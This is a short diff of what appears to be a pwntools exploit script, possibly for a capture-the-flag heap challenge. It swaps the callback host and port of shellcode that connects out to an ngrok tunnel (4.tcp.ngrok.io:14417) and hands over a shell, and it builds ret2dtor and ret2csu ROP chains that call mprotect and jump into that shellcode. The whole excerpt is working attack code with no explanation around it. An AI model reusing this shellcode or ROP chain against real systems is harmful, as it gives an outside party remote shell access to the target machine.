@@ -52,8 +52,8 @@ arena_off = 0x1bebe0
 mprotect_off = libc.sym['mprotect']
 
 shellcode = shellcraft.open('/dev/pts/0')
-shellcode += shellcraft.connect('0.tcp.ngrok.io', 14643)
-shellcode += shellcraft.findpeersh(14643)
+shellcode += shellcraft.connect('4.tcp.ngrok.io', 14417)
+shellcode += shellcraft.findpeersh(14417)
 
 log.info('Csu adr: ' + hex(csu))
 log.info('Dtor adr: ' + hex(dtor))
@@ -84,7 +84,7 @@ rop.malloc(0x1008) #3 qwords
 ret2dtor(0x3f8 - 0x20 + 0x8, mprotect_off - arena_off) #uses heap adr 2, chg libc ptr to point to protect
 ret2csu(0x3f8 - 2 * 0x20 + 0x8, arr ^ (arr & 0xfff), 0x1000, 0x7) #uses heap adr 3, calls mprotect
 ret2csu(arr + len(rop.chain()) + 15 * 0x8, 0x0, 0x0, 0x0) #call shellcode
-rop.raw(arr + len(rop.chain()) + 0x8)
+rop.raw(arr + len(rop.chain()) + 0x8) #shellcode ptr
 
 #log.info('Rop 2:\n' + rop.dump())
 log.info('Rop 2 len: ' + hex(len(rop.dump())))
